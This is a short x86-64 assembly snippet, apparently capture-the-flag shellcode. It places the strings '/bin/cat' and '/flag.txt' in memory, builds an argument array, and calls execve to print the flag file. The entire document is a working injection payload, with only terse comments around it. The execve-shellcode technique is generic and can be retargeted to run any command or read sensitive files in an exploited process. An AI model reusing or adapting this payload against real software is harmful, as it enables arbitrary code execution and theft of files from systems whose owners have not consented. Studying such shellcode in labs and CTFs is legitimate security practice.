# "/bin/cat\0/flag.txt\0"
movl	$0x6e69622f, 80(%rdx)
movl	$0x7461632f, 84(%rdx)
movl	$0x6c662f00, 88(%rdx)
movl	$0x742e6761, 92(%rdx)
# I don't know why but try to pad to 4 bytes to avoid junk.
movl	$0x10007478, 96(%rdx)

# pointer to "/bin/cat", "/flag" and NULL
lea	80(%rdx), %rcx
mov	%rcx, 100(%rdx)
lea	89(%rdx), %rcx
mov	%rcx, 108(%rdx)
xor	%rax, %rax
mov	%rax, 116(%rdx)

# execve
lea	80(%rdx), %rdi
lea	100(%rdx), %rsi
# rdx is overridden at last
lea	116(%rdx), %rdx
mov	$59, %rax
syscall

